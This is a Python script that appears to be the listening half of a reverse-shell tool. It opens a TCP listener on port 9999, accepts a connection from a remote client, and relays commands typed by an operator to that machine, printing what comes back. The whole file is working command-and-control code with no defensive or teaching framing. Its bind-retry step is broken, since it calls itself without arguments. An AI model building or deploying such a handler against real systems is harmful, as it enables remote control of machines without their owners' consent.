import socket
import sys


def create_socket():
    host = ""
    port = 9999
    try:
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
    return s, host, port

def bind_socket(s: socket.socket, host: str, port: int):
    try:
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + " Retrying...")
        bind_socket()
    

def socket_accept():
    s, host, port = create_socket()
    bind_socket(s, host, port)
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn, s)
    conn.close()

def send_commands(conn: socket.socket, s: socket.socket):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    socket_accept()


if __name__ == "__main__":
    main()